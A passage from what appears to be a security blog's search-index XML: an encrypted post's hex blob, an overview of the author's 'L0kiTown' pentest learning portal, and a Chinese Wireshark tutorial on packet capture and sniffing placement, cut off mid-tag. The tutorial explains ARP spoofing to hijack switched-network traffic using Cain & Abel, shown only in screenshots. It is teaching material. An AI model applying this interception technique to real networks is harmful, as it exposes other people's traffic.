20a41265defaddde6bb71b208d7e11088af91066fb1041cc545ead1c25834c3f2001233a5ceaaeada4938418ef483b25cbc663fa6174ace7a7c9967fdd5ab66888d11c5d118d5b7f20341d0f96c73c6ffad023126ac65d41d7031ef1e16d984da5bb173fe71cbebc96197dd9ff8be959af628067f7be3b68c7df49a9e60faeb3cf3432f702037ebb477f55196e90ea997a2a19ccc54bed3e92fb9e9e8dbc14b50ca0855cc455b3b4012d64e3c20a701f3d953769cdd870599e4ac7ed44a27d6c4a17933ee8d3ad6a9d87626d616d00507925415566e659989d33e18183d9cf9a6078850548445dae30c12e8341e534387f9e9d47caaa3f9d80ab538a4e0c00ccdbb4d91adcc32c623264e429735e386cde043829ab891a57863902949204fbb8a71c4936dae1c89fecb1b6f7eb3934b738e5c568e99d77ed0fd4fa015cbcdf0d52dfd67870340030b2ffe95a2c2e80cb5991856975819c5e23f3cc1f5ab1124b516aec9c53480bf8371b75a20e6b9be8f33e6b4dcbe281134580085e335532f9b45b81b383330e8230ec3d332f7d1397a29ff5084ba6098d05b62a96ef763318fbdfc09287221a2e2283fabd5c9db798e1df5242bc4b17f772b248a477b2d6b30ea8bb38d5d4f6b56e7fd7201a2942650fa96e8fbd013e10f2825331a96aba5018889f38b414537f4d2ffdb24e0cddc8c9d4cae7e5e235a18272e68d63a5ed08e568658e4f9a817d4d03e5e38f37972c1677d92b67383a0a910df07b2d35247c72ab6712964d141ddd3b9e2e3a1ea08dd8032e606b5cc96aefd64a41743daf4fa2b014b0217827a9310ee54385824d14d90ca4874d8e38c5d982669a45335bdcb38e6abc695d25337afd854ecd3aaf8002c0311700508b868beb099fc312703f3b90a5e022427d1fe28d941a104376e540d9ed56ee3a96a9835752e0c287eda31973cdff80ccd6c4bfecbbfafa676f3baf3d34b45a7631993c3c089dc4e382f58400b2fb28f7a064411927930a11c04d9a91c6aa0a60962315d5253f5af1a15074d01822e2b52d16a318b4d9ad8b1e78eafe8d5b1ec433198c1aea8236c7e58fecdc54a03a5545d9a86ff9274dff33e45b6a88b7bb40d721581f729475f90d17972d32a1ce30c6bebe52e3e009cfbb0c747ea7d032c04540ca324ad5ba2a1a61740f0ba7d7b45cda486808e4bb5836bd3979a93c91e64ea8eefd8e61767b055be718057146f518224705b8e668effe134cb627e566cb3933125bbcb3ec47ceb8726267e26f68954b79593f21747c60be8a3da22d14c5a52f0cfa5caa1eb5884ff1b6499d84ebc9f3e2b3b8ec95e82ba250e5dfb88a6c02ed773f940bf3c381a5fb8529f14b6ab4412f12152f9b0579da4b969814a5bbc8192afbef4b00d7e32eae9ba25830d74c9411a77b22a636ef3619a010c6febf780625d5c4a23c149aa86e4ab3608252c4304026b106021b7180865cbec9dd23e56c7875e9be31062d6a4e9c498b65996dd42e5a223f64a58966de224d73a728bf13133ab4e71a831da006bd3798b053e4b42503984432fd4c8605432ea66dc0a47d5d24828b7838c0f852eda5828f7b74b7164daca8b3df4b917879f02e4b6fa83206307e772d7656ea0c4ed4f02525ba752327b2151935a332652943d2c499dc24897ff73d306571b95bf6751c17a28f448713f8a06879b069d335f3840ad63212172984d6397daab345144a88a31ff24d8e1672d17af21c8aebc99682635cbce042afe3711793d24f45069f56bba99442be8ae8a4a8beee004d06b46c4ef8607a75cd86ef23a430a593bea37166137f9999c078ee1ce948c729bc1f9bbc384d35dd2ae081b5d598007f77d5db256cbc21e9641fa8c2226006aad678f1f7d09e29aea5680fe1ea590e65a35757b4862e954f0d8897841cc2fe640c0a1ef987c0ca77be10ce449d2b3c9d336a6e4ea3b20d8c7f9fc0e9b136a5d3b6dadfbee71c9a904b91963bb7dbfcc7556731386fbd2a1304f6ad1de2ab8b41317d46634756f1fda6509a1d51e20f4f325dcf050c933dc7179bcff5108440b8d75290152cbf4af92c95f542ec209550da2e57436a0c838a9a178e3027234e237791be9d467d557967c9fefc26634adf53a02727a66a6a5c1c6d77d156437db9a2c8979d72ec72afa1de4f75f0ca9efdcf1f947080b6483319a1bcc580fd256b3b4814646ab074f190230d5fdc0a9a07a79b77efbbc4f9e7cb2455befd30fc07d75bfd0bbe10b19ea3431eb55f5b1e1e0681377e90375b18a2a21fdd5929e9ed3fe3638ecdc5fabcd805c06b524dc80e86dcc99578a67ac274a0960aed0e2e71d26e2776b3abff21ffeabf3712727c2b9254e97531b792d3e31a0eb6a1a068f5fb08b4c6e2982c1222e49b12f99cd1eea29b6137bd99fc097a9bfd1a9a118f5fc510c4b1432f0bd8e6b41d0f51c4eda77b7204de53d821f155b15fc41403a10e4716d5509d8baecbccc08b7064792d7a99442e2c342a1f75267169606f738e2e1b3a551f7b610c350147fdb9ae3390bcbac3d4bd91c5e2f9013cbe00954317736c6e7a6f42a6578c0aeb751992009fa4cb42f0d87555df061b2277599f2e1993082a6f707ac98c0d270faff50bd487b00b9db7f317b557c57fe9abaf81822a62ef74f7b88d310a369a17b214e13349670bb0bb8939faf89409c056af6b1c9fbac9bd54e5c6ebfe2fd9097397e6d50b75af93ab4488b817d7c8810f850ecc4949aa484a9389c29276ec2006f436334b5ecaed538c1dccf98f8262f7676edbe650f8458de0e37d39e1b660a7178da22b8b1fc6df900a98a597636341ec9a827ec2e1fb8f3abf5bda2e1b98ef11794c27036ec2119d7486934c140069d3eb9b0dd6bd8ba6cbc0af7d9490b7930e4c58ddb1baf9181463525dee002cc81694e379fb659416fb171d01397faaaa05efcaa61674d492da14676c48aa81b333a227b7754a2d366b63d953054efc63fae46c511d928b563249625158f1db9ffe6c92307df85c4b1bfe6ed308af640ee08a4448547d536884f171fdd44c3c3d249601444025c22216141f74944bea9f013cf527e911551fb94ac3e5ad0a09323006c457c36da3c6a7ff74ea5a5ed9591d39c54a7d23c976997ad37254267a9dfb50e0f1fa7a39e6641fae57cb739d5dfc6caba752e126d91c18e2e63f13c16c9e9956899ade82b623ef84765b21c7638c7de27d9fe8d7f1d19bc8849e6fa60e967f3cfa86d895f21cc7ac73c74bf545fe2a801c44b6dcb2824090d67699eb01f79a7bcbefa833b1d7556e773efbbdb051be267fb5b14326f204dd0915c1ba3ccb457f6b5a24007f6b197558597f3ed1eac1d3e4f2fb347ad8a3549512994caf32d5297633335fad33f9f65c65a5dca64f5d30be7235dd464066ef73693f8721605fb5bc9b136d2fc9926d8f8385946d48558f6f88be7064422d8ff441319c5169191580e6474a5c82c869ed0116910e641c9cfc8ed481454783346d9c366a054702c4ad6c18da229485c88027af09d7cd9e8fd058c574ffc78deb12590c531c767246ce979c36e873f1420febf388b17b4261211a25345d4088f17991414d5302902ff0754551f6338384ea8154ada2d53993506d7faab31b882f98dcec04853457cb8386d6c2f4c443956fe5410720ac4afbda95320d248c69134fa768bf2c7003b4a0a6c423f736f7d7749cdaf3c8d1364db75c52c547209c44bd8174c70a593e539e3e7cb333a113de3efb43f28f0eb6bf30c8ed7f8d0e3c3fafc714a40fb9aeb58662715d5f2127efd134e81ec4e57065daaf3e0892734e09a956f4aa1fdefa1f3099412347d9fa83c8139fdc8b586bffd17a82168ababcc35103a87af0155c6f491befe056c3767dd0c087872e1b129458c214e5185f26e9454dc4a0022e5ab83525ffa1aa3ee127bd7c5f93be1d8a6a37bc23b8c58f71aea975fb26e3882ae4207dcce29435ea2ccc6f6f69382305679c4534491619f98d96242a872caabee42cd9b4a1cc0181e7c34e0bd8e07e6272ecb800e191308e4c4b4846fc3defd0478e99efa38384c59e183bcbbce88934b85b5d77cd651bf8ecc61fc7ce29441b4b6a81b871805886238a0ec0c09ea77a010869a3831ba205523a1a66f976a23fc0f4ac3b414e2a5bd8b131609f057674738e3ec1a97299695bfceb2fbe085d2c682d173e1d87b680961eadab9aa4b9e2fb0600a0785ef4bb596e97cfaf9f26dc75ba9dffbce066e8217ed82bc18c5788ea05666ee6951439462ac8993d896955bfc3ea77878ec84f4329cf2786d5fe1e00873710bb6d06178fc939982e73053b448944851cfae2eb986756f3683b686e082e4c6f3485920ba589e4441d97931b3b5662ab249427c3e3feae67436c43544f7cd35d5cfd1433a6fc00d641e9dc73d2f05888bc3e20998e537fc718fec0e573f4aa98117cc8240dabcd1f6ba61f85782908ba154afa64e939673b3d9eaa362a58858913b3096c9d1ce914791d33b2dfb21ec87d36b85ca80e8d63bc3fcb33036df3f143f825b7a1dfc63f29b0e43670a3081b400f8c9461c6e00d3e757537a783244110e38e36260ab1cb0adde77cab9c05d4d72432ccc4b45e9806cb4eab11f61755baa4bc988af93da4666749844aab54029e476a6a819ef95768be6cad5fc68a0c9ec0adaa15ff8c7401d789e0d8c4c3dcb3f8bba12b0ff144fe670549fab1c55abaa0c5ebbcdc83ce5f434f742f53896871a754870f7bebbfcf11c61b4bf7469782e5fd199be1e8f3b2dfdb3ea4d8aa43adb4aa858fb4306792865779e25954a958dfa0048e2d157e48ba1ddf5a87e0c3d4e0da2896ea8e3937d88ef29201297abd33e6faa934d6f57aaa7c1dfa5754f269d2cfbcda68865a65876557e50207a4ee675ba4439c46484dec0c4b2c95fdd6d66290deff92d5b7b94d835d75dc2749a8b1c689aa01bd8202102b1da5d2b934d3e296dd5bd58781170c8c480978675b477eee5f5ba38687a0bfcec768d2111ee5efbbfb6fc72907b06ede759c8f04232d76a40c7b4002139cdf617a65311a0c16f9e14a3d5a5a26ef3991fb556275e178dfc5251b75fc00fcec57c8d948b38a757f635a352d06742557c7752896f986a1542494d2c85212418d4c120358155c0b50b1ae6c719984c3c2c35862dc6a6c99f0800ca981ca1dcc480c507ae46b25a2f293d564552c2c85762e771ddd12e72ff04b43b7411fad1b62b88fc43182a91bc281279059e4222d71032966cee10cb8132722d0fa882668783b5e31d911706b3aca3175cf258684ee74d2d764b021d783850bf1d6a34859045303a18cbca9e0072ba8e7ccecb524f0f926911b942b20d9d26822d2587ac2906ff129609b74513ac08da57a27c40539f25613d2007f6fe15f4cef56a7b39db9ff5cf226c3a2d42a86cfc28957ed6dc0bf7c27eda759757bf7d37daf5af993dbf9042c60516aff8e3a672538abf64b3b197fda86b5cbf88f4044dd63e6dbe826af0f0681e5e28ca128c2f1c369642c3a6c93a3505a1aee95dd7289959cc7972a5a3ba13514a896ac0e5618e9e8d83e0dad3fe9a69d729d23002a9eae62cade35bc9fb1177a5941e4b66d1cbbeaf6271ec11ff86278ba65d0d0f01de82bd5b86e7907f0bc20a9f5bd35aafd6a7bb53279f2c1cc9131cb969860f3fb2cdf9b4d46ad9d02af9ad59404f319fba236c4281a34a1b2bd12b6cecec323cd8c7b3ccb871135f3f13c6c56513c682fd69fba44bdaabe54819d3418eff6822fb6ee791ad46977d7af67910dbf04310248575a24474441f36add7d09698f1c78ddc7f9bb4f1e4ea03497c36430098aaaf7b610b7d855cf9c3aa6d804d44940b35a0cf8fc1aad4d4383e810a301dbd873842228640ec28c05e3b43190cd0afff84d6b6ab65ce2ce332c1cdfae3f3953584d6eca03f0114aaad1f33f2014d6f587bff2ac9e61277a7fd80c11ddc41a7b2e8655b53b3f782fd354be165e9d795481f7603b95e5c5b653572e5db366d9e54d3b7abac815001daf62600b706c02e8791888547948703e3ac9a5131da73d21387446bf98761a5ac80e6574b6cf207d40eda84f0f49a8f1be28283b18a0a8f8100ecfaf80151454f3620056e8025b1731428230763115778ce03a9ee98681bd342064dcc17c2330a56c59761ff7ab76bbf4d12d4e09f27d517437423442d7c0aa13cc30d0e1add66d6dd3d67d162d7b99aadb9eb7f8f560749cc9a6cc5eee3461082bb31890abe995e798ec1f4b5bc683b50141d5bcd9088d7f03c8dcbe53b4f7a517bf7c44f8f65dced289c76bd6ff6d305830c9a50e7b86214805e0e807afa429ddc7b7af2913884bc6454041e23bb9dc53882cedb75e11486706bebf2471dca7fc6ab3e9928d521edd884422aad7c61fe72117fa2052e81a5f5aacce3b118abed716d20a6a3cee2ab68d296c36164d64417344d321f92073c9f3628677e9ea485d6f0976d9996d23dd0c02c54b1854ffd75c0bc1e6ef67932827c20252d6cbcb0021da862ade55a37c226a91f47d6a51cf78de968537979cc6d29351c3d18e5acb7493d7e56046210bcd3a419f57172a5deadcc35773e1bc75a22d880a5ac8ea7a0a3a89b260e84c32803f9b3b84ce2c3dade24a14198b9eb9444c9aff2e20c29c55b77acf9dc6c9ce95ca04f3522f920fc06e08bc256617e53589e30cef9da3f7060c349eafd2d611f35589c096cc569e4086c9dd61504a3f4eea8ce0dfcee96222f974bd673953b1179fcfa4ce6460d71a1171e760e1b46087e7937c0f3835d83f0d75dd0f3f2898f7dbc043cc1a256c6683392fa66fb27e4ce0ba567d42e7638b1b8111eb8e00f0f70540d13024344d0e5c07c7c05ed026a61b9a9fecede14a2245a3ec3cf2a6f214f9f5ddf5fe19739dfcea087d80cb8fb7628d5ece0b1d7b210a601c9a8bae289140a4dda0caccb12bedfb10398dc816334c6fb9fe638552c4f2c399f4f830e67c9473a03f4d3e40bf0c2cee245e7349de2f7ccd3732e46e4be89d9cbb5aa09dae51068faaf35011e838c8370a57690094c5b53d08e6b37bb17fa74513f8a96380f9d618214a14fc68f48808cdf9819cd4685b8d561d49974508909a04633ebbd0b193e59d661598e11a05ae3d33c0b54d9f34374fcbe6f69f78823071a77b193cbe8999b937f8f767e37e4d8b3f6fe7278b8d6657fabecca2edfd19ba6a550bf3d2f30328df77a7e42fc021202d2532b93a9fa2808982bbbf5e20e39174d96a3e6a35ab424b3e82f781584763efd2fb944b4cc6b160225d0796fad868f89e4ca95fac1c7c4debb55d3da98cc9b2c339a4e9a8470a9fff44f7db1748897db12f316380d688eb5d2eb98ad395aeba2ce4f7ec8b6e143bc2abcd075f3319f26a0fc25957c7e5aa83b2b0f02f5294871ee795c1f115630c186604ddb4d712b47fd47d6d5188bf370d32c72224e34c2e95a0a84d2440592c94d949412d8be82b64758611ac4a391e8bf32ea94bcd64e88c2d9d8e8d681acb0af2ca53c175b29d7bb9523133628b3fa2c148e07d6dfbbf0aaaa1cb730322779f90a986640500ca0d03773c6dc9f50e371ec205d0f3787be5f8e04d9b3ff6ae376a2838609fbac482171ca0610dd8424c6cfb6f95b6294b91fa6eaed299485436f06f7ecf900ff9dcfb7186113e9dc015323f2c8bf39d5174c01a407bc14bcaea3b0e541e0eefda67ee9590cddd23e2969e302279b69798327d339a8341900aff9b40d7124079b0e9810ca7d43037430d945d3cd243976c86e4e4a457d571b1e72239f8ad69825f810a45faab85c9c92cb78952af9b33cba4a6ecec5aabcd36c5aa9fb13d8e4b951d7d6bd66a3915ba70a33149b89496076aa3e4de315bbb6bd6cfb46d98108f8e5492672f4771fdd8e22eb102793d7c108d1edbba64fc89fd0a037b14c234abcb9f6d795aace4053ba2a206319c68ec90ca7d0ae807fd5355695a5107797eecdfa870619ea10c1c278ada6d4835cecc7328dfbb8f2927ad64ce6f5a96773b81eeb8ed79242d827b18d273dd4849f39ef8cab536dd12e0e5e0ffebefce173135c4ffda3bc02b9de631162e9ad37ea7d836c1e386ff6c3a4b08c0e1e73f6af978bdcc9cc05d9b4647e29e5abec0af0cd9ec37c01ebd7092bb1bc2e38c882a0c2793f6f2312a2fa0c94cc98a9b64cde94b8e91b891059501f80cb17583df641313682da7c86e87b75208cc1ae4e3b89abeaef316b86224fd09a4b0f83a4a53ae80b00b3b991d6b29e64f4dd388f085f7fec6e6b698d1266d7ff6037441ba27eead27397d679d68d97cf04cd3c1cf103fa90789a544fd1b73e17f0289469f2fd2efbde40e81741c6ae28bde99f98f7110c561295763156af43ce7cfcf28719fcfaf78f85c51f09bdfed5ff133e8e9bc4b1c3d8d02f1033da20a93c26fcca8196e2ebcd46f9f5c67ad7bc3fcdc03be8fb4dac76547d31d43c7c511ea0080c9c3461b660304dc43375bda678f9ba1337eeedf1accda20eacd4fcc536fb80024045e1674627f39b7c5375bc25915ccffca46d56e9f973a04afb8de3023a8cb53c6bb14cedc1117167f3c76249e68093cbaa0dbf05c2125dd1b598c4c24463a86095ba4ccd87f8771db5f7a8aeb3ea930f723f60d364b62d09da9867e0d5dee981528e6fa10bc02213da6b31277db33b053ec91f589668c37e16603883c9b16a5d19a61ac7f51bf4be03feef3fadaf7279c036e2db51eda00247b1b7a3b17e8ff3cfe80ed7a5e4f4eb01da6c8793d6359a867321d6957c601519412ce4a339317661430410df0da338c58ec397579c45cc9a3adb1e6cf9d992e6eb39290125d69a3454ff777110cdbcbc6b697f5d92881c48e9d41f61ee7f2e245d4dfd9b95fdda7a798507d1ee0d09937ea8c410ae87f81bb85c1d7a1ffad6f99e781daf9f0bee721c51196666dd4642f0f22d815f434f227c53edf0d009e19f25c3b385d1717ed8a6e6da2a950549d527618a2713a3df4295126b9c12010ae066416a29a05bb069a207c664ab97c3681839aae4e82bfc34f7c879981e5d844d06ab581bf3976eeef0ed3da31b660cf65c27c9f28b00a59c6fb3ba55fef0f2471c5df03c727bf2a90000c0b540f3eb90253801c62c6cbd554a52bd26efbdacd2fd042c07aff27686eaa5d349f2597bb54653bc160b55d9cf07927becfd1f1ce448426eaa8a31c268b03b6988ea011a946311773b39742da45bb6397e03f5861320597b64d4347df08279d20a5303f9fdc0609ee26034d6864b30547b77b6fd59d4f9ac62e7db68b1f686f4bf2f8036698f3130c36b03170d939f241b1297958e9e6a4e1e5751d2f90c6e23ce1cb5536d988dc119b6e0fc903eae9222593b8e0bbbc0c6cecde9aa27f0b146907d85947306460fda26ddc200c9f0c1c8eb6b3e63051e0a12677ee995eed175fb5b2d43d922ff428dbe096adbe42c04b547b1755cecd02afc0c55886268b9bc6947bef2aa64befcbc8396306709c8231d8bfe8596454a9d0e714e726d51347d210f066b984023b3670d88b4e6d4b3b7f8ff3abd473dc19e1f3331d36e245c1e1b724455d4508364914dd0548f42aefcf74f89f23d4770e4c805d39584fad70559ae9de9b242da27419e482b2438bf1e2bfa8b853fb5b6691810accbeaef49d4ac11b77f3301ecd122f8120fad326f6d03f560f6724de70c57fd647cdb1915c4ea5b3250741d25a56266f4760d91c908ac9d2665bc7ffbec3033dc999938b74b40e7067f397e52584f4b768a48b8756172b952f6fd19063b36bf24c6154ae8734c63bc7e439beb313f8927f2b523b618ac12439ee82057affab7db2e9c86a6444a9b53cbed84dcdf1dfda0bc74b0f36675fdd7fb838eaaa74f1a565e5a1efce6c36e0c531002dfdfd8fa07f937d34eeb1fcb357b6a0f305e2ecf3fb365cf98b33bf3770a07dc89acd57c8e0fc8d9d3d8934a0426f4963179dbf29e711621228b59166e0e0f60299c77f46207ed427017e0ad88fc55d5192b257f1d43f53021ab02a8b77ba5d67cf71109b9f69dd0962a5adc1d527237bea532e74098955ff294f2351ce9015c95cd1eef51c13cae218763bbdf62b931a5460f33d2ff5be65d96acafe5616b456e59c3118baac5c8cb104c17b151a6e00ac0833db9f5f53b47591513b1322c084effbe102e9bb273c196002e53421535b9ebe64619631e6599964652c3edb1435b3bff8550eb120a08a91985b062fc5ef4af0e011788111ad01846e21da333466e5c607f3776c18ef839dcea16b664313feb0d30fd908b1abd9c8ad024a14c2c8601936dc71600f7c886f58689a09115c56fe83999a063551b04157659ffe44cd43de74a3fb49d3b52a826f7db031892aeefb8f0e3afb6cbb795d3b59316e9701da1cd9f6c08344a3830d5c77481a79cf42b7eff5be23c894057f11300af38c1adfe5d313de6841acf76738dee854d70ca2bdee58b9c92a048954226461ab937e6aa850ad4b262a8f993fc443adb22f682d190141a45a55e1ec5ab8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L0kiTown v1.0</title>
      <link href="/2020/05/13/L0kiTown-v1.0/"/>
      <url>/2020/05/13/L0kiTown-v1.0/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>I’ve always wanted to integrate a learning center, and finally managed to do it. The 1.0 version includes a penetration testing lab, penetration testing tools, a penetration testing target range, a network disk, and a resource sharing center. You can access it <a href="https://demo.l0ki.net/">here</a>.</p><h2 id="User-Guide"><a href="#User-Guide" class="headerlink" title="User Guide"></a>User Guide</h2><h3 id="KODBOX"><a href="#KODBOX" class="headerlink" title="KODBOX"></a>KODBOX</h3><p>The KODBOX module is for network disk and document collaboration, etc., and registration is required.<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200602205103699.png" alt="image-20200602205103699"></p><h3 id="Pentest-Lab"><a href="#Pentest-Lab" class="headerlink" title="Pentest Lab"></a>Pentest Lab</h3><p>The Pentest Lab module is for penetration testing labs, which is not open to the public for now and is only used for my personal learning.</p><h3 id="Share-Center"><a href="#Share-Center" class="headerlink" title="Share Center"></a>Share Center</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200602205213381.png" alt="image-20200602205213381"><br>The Share Center module is a sharing center, which includes a penetration testing target range, penetration testing tools, and a resource sharing center.</p><h4 id="Pentest-Ranges"><a href="#Pentest-Ranges" class="headerlink" title="Pentest Ranges"></a>Pentest Ranges</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143044397.png" alt="image-20200604143044397"><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143107832.png" alt="image-20200604143107832"><br>This is a penetration testing target range. This module integrates all usable target ranges and is for learning purposes only.</p><h4 id="Pentest-Tools"><a href="#Pentest-Tools" class="headerlink" title="Pentest Tools"></a>Pentest Tools</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143117977.png" alt="image-20200604143117977"><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143135098.png" alt="image-20200604143135098"><br>This is a penetration testing toolbox. This module integrates exploitable penetration testing tools. Among them, PocBox is produced by the MIST security team and can be used in conjunction with the DoraBox target range.</p><h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143157969.png" alt="image-20200604143157969"><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143210690.png" alt="image-20200604143210690"><br>This is a resource center. This module integrates downloadable PDF resources for learning, such as mini-program development, blue team system construction, etc.</p><h3 id="Contact-Me"><a href="#Contact-Me" class="headerlink" title="Contact Me"></a>Contact Me</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200602205841633.png" alt="image-20200602205841633"><br>This module is my blog and can be used for learning and reference.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>L0kiTown was initially intended for my personal use. If it helps others in their learning, I will continue to upgrade and optimize it. If you have any suggestions, please feel free to leave a comment.</p><h3 id="To-be-developed"><a href="#To-be-developed" class="headerlink" title="To be developed"></a>To be developed</h3><ul><li>Blog wiki, <a href="https://www.mi1k7ea.com/tags/">reference</a></li><li>Toolbox production</li><li>Introduction of local penetration tool jump links</li><li>ifream online code writing</li><li>Markdown parsing code</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>From Basics to Analysis with Wireshark</title>
      <link href="/2020/05/05/From-Basics-to-Analysis-with-Wireshark/"/>
      <url>/2020/05/05/From-Basics-to-Analysis-with-Wireshark/</url>
      
        <content type="html"><![CDATA[<h2 id="数据分析基础"><a href="#数据分析基础" class="headerlink" title="数据分析基础"></a>数据分析基础</h2><h4 id="数据包分析概念"><a href="#数据包分析概念" class="headerlink" title="数据包分析概念"></a>数据包分析概念</h4><p>又名数据包嗅探或协议分析：</p><p>捕获和解析网络上在线传输数据的过程</p><p>目的：</p><p>为了更高的了解网络上正在发生的事情</p><h4 id="数据分析的目标"><a href="#数据分析的目标" class="headerlink" title="数据分析的目标"></a>数据分析的目标</h4><p>了解网络特征</p><p>查看通信主体</p><p>确认占用带宽者</p><p>识别网络高峰时段</p><p>识别攻击和恶意活动</p><p>查找不安全和滥用网络的应用</p><h4 id="数据分析软件"><a href="#数据分析软件" class="headerlink" title="数据分析软件"></a>数据分析软件</h4><p>Tcpdump(命令行)</p><p>OmniPeek(GUI)</p><p>Wireshark(GUI)</p><h4 id="数据分析协议"><a href="#数据分析协议" class="headerlink" title="数据分析协议"></a>数据分析协议</h4><table><thead><tr><th>层次</th><th>协议</th></tr></thead><tbody><tr><td>应用层</td><td>HTTP、SMTP、FTP、Telnet</td></tr><tr><td>表示层</td><td>ACSII、MPEG、JPEG、MIDI</td></tr><tr><td>会话层</td><td>NetBIOS、SAP、SDP、NWLink</td></tr><tr><td>传输层</td><td>TCP、UDP、SPX</td></tr><tr><td>网络层</td><td>IP、IPX</td></tr><tr><td>链路层</td><td>Ethernet、Token Ring、FDDI、AppleTalk</td></tr></tbody></table><h4 id="数据封装"><a href="#数据封装" class="headerlink" title="数据封装"></a>数据封装</h4><p>协议栈中的每层协议都负责在传输数据上增加一个协议头部或者尾部，其中包含了使协议栈之间能够进行通信的额外信息。</p><p>数据封装过程将创建一个协议数据单元PDU，其中包括正在发送的网络数据，以及所有增加的头部和尾部协议信息。</p><p>数据包指的是一个完整的PDU</p><h4 id="网络硬件"><a href="#网络硬件" class="headerlink" title="网络硬件"></a>网络硬件</h4><p>集线器：工作在半双工模式，即可能同时发送和接收数据，会将数据包广播到所有集线器端口，适合用于抓包</p><p>交换机：工作在全双工模式，数据包发往目的计算机连接的端口</p><p>路由器：负责在两个或多个网络间转发数据包。</p><h4 id="流量分类"><a href="#流量分类" class="headerlink" title="流量分类"></a>流量分类</h4><p>（1）广播流量<br>广播包被发送到一个网段上所有端口，</p><p>二层广播地址是FF:FF:FF:FF:FF:FF，</p><p>三层广播地址是主机地址为255 的 IP 地址；</p><p>路由器可以分割广播域。<br>（2）多播流量<br>多播是将单一来源数据包同时传输给多个目标的通信方式，避免了数据包的大量复制，减少了网络带宽使用率。</p><p>实施方法是通过将数据包接收者加入多播组的方式。</p><p>多播地址是224.0.0.0 ~239.255.255.255。<br>（3）单播流量<br>一台计算机直接传输到另一台计算机。</p><h2 id="监听网络线路"><a href="#监听网络线路" class="headerlink" title="监听网络线路"></a>监听网络线路</h2><h4 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h4><p>数据包嗅探器放置的位置</p><h4 id="混杂模式"><a href="#混杂模式" class="headerlink" title="混杂模式"></a>混杂模式</h4><p>需要一个支持混杂模式驱动的网卡，能够查看到所有流经网络线路数据包的驱动模式</p><h4 id="集线器嗅探方式"><a href="#集线器嗅探方式" class="headerlink" title="集线器嗅探方式"></a>集线器嗅探方式</h4><p>流经集线器的所有网络数据包都会被发送到每一个集线器连接的端口</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508130300217.png" alt="image-20200508130300217"></p><h4 id="交换机嗅探方式"><a href="#交换机嗅探方式" class="headerlink" title="交换机嗅探方式"></a>交换机嗅探方式</h4><p>端口镜像、集线器输出、使用网络分流器、ARP欺骗攻击</p><h6 id="端口镜像"><a href="#端口镜像" class="headerlink" title="端口镜像"></a>端口镜像</h6><p>设置连接的交换机的端口镜像功能，将交换机其他一个或多个端口的经过的数据包复制一份到嗅探器连接的端口上。</p><p>需要留意你所镜像端口的流量负载。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508131139921.png" alt="image-20200508131139921"></p><h6 id="集线器输出"><a href="#集线器输出" class="headerlink" title="集线器输出"></a>集线器输出</h6><p>在目标设备和交换机间插接一个集线器，嗅探器也接在集线器上。在交换机不支持端口镜像时可使用此方法。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508131251593.png" alt="image-20200508131251593"></p><h6 id="网络分流器"><a href="#网络分流器" class="headerlink" title="网络分流器"></a>网络分流器</h6><p>类型：有聚合的和非聚合</p><p>相同点：安置在两个设备间来嗅探所有流经的网络通信，</p><p>不同点：聚合的是三个端口，非聚合的是四个端口</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508131649207.png" alt="image-20200508131649207"></p><h6 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h6><p>通过发送包含虚假MAC 地址的ARP(地址解析)消息，劫持其他计算机流量的过程。</p><p>它是在交换机式网络中进行的高级技术。</p><h6 id="使用Cain-Abel-软件进行ARP-欺骗"><a href="#使用Cain-Abel-软件进行ARP-欺骗" class="headerlink" title="使用Cain &amp; Abel 软件进行ARP 欺骗"></a>使用Cain &amp; Abel 软件进行ARP 欺骗</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132031567.png" alt="image-20200508132031567"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132043069.png" alt="image-20200508132043069"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132151852.png" alt="image-20200508132151852"></p><p>此时利用Wireshark抓包分析即可</p><h4 id="路由器嗅探方式"><a href="#路由器嗅探方式" class="headerlink" title="路由器嗅探方式"></a>路由器嗅探方式</h4><p>在处理涉及多个网段与路由器的问题时，需要将嗅探器移动到不同的位置上，才获得一个完整的网络拓朴。</p><h2 id="Wireshark基础用法"><a href="#Wireshark基础用法" class="headerlink" title="Wireshark基础用法"></a>Wireshark基础用法</h2><h4 